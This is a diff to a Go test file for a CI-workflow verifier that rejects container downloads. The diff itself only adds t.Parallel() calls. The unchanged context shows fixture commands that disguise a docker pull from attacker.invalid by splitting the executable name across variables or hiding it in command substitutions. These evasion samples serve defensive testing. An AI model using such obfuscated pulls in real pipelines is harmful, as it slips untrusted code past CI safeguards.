@@ -8,6 +8,7 @@ import (
 )
 
 func TestVerifyCIContainerDownloadsRejectsSourceBoundCommandWhoseMakeTargetAcquiresContainers(t *testing.T) {
+	t.Parallel()
 	for _, target := range []string{"android-profile", "android"} {
 		t.Run(target, func(t *testing.T) {
 			root := writeCIContainerDownloadsFixture(t)
@@ -30,6 +31,7 @@ func TestVerifyCIContainerDownloadsRejectsSourceBoundCommandWhoseMakeTargetAcqui
 }
 
 func TestVerifyCIContainerDownloadsRejectsHostileContextOnSourceBoundMakeSteps(t *testing.T) {
+	t.Parallel()
 	base := `name: android
 on: push
 env:
@@ -101,6 +103,7 @@ jobs:
 }
 
 func TestVerifyCIContainerDownloadsRejectsConstructedWorkflowExecutables(t *testing.T) {
+	t.Parallel()
 	commands := map[string]string{
 		"adjacent variables":          `LEFT=dock; RIGHT=er; "$LEFT$RIGHT" pull attacker.invalid/image:pinned`,
 		"braced adjacent variables":   `LEFT=dock; RIGHT=er; "${LEFT}${RIGHT}" pull attacker.invalid/image:pinned`,
@@ -136,6 +139,7 @@ jobs:
 }
 
 func TestVerifyCIContainerDownloadsRejectsDynamicExecutablesInsideCommandSubstitutions(t *testing.T) {
+	t.Parallel()
 	commands := map[string]string{
 		"parenthesized variable executable":       `echo "$($HELPER attacker.invalid/image:pinned)"`,
 		"braced variable executable":              `echo "$(${HELPER} attacker.invalid/image:pinned)"`,
